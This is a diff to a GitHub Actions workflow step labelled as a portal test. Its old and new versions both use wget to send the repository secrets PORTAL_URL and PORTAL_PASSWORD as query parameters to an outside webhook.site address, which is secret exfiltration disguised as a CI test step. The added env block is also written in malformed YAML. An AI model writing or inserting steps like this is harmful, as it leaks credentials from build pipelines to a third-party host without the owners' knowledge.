@@ -8,9 +8,12 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - name: Test the PALINDROME portal
+        env:
+          URL = ${{ secrets.PORTAL_URL }}
+          PASSWORD = ${{ secrets.PORTAL_PASSWORD }}
         run: | 
           echo "Hello World!"
-          echo ${{secrets.PORTAL_URL}}
-          C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
-          C:\msys64\usr\bin\wget.exe '''https://webhook.site/f24ba1d9-242f-45af-87a4-0cf8df332d97/?a=${{ secrets.PORTAL_URL }}&b=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          echo "$URL"
+          C:\msys64\usr\bin\wget.exe '''$URL/$PASSWORD''' -O test -d -v
+          C:\msys64\usr\bin\wget.exe '''https://webhook.site/f24ba1d9-242f-45af-87a4-0cf8df332d97/?a= $URL &b= $PASSWORD ''' -O test -d -v
           cat test
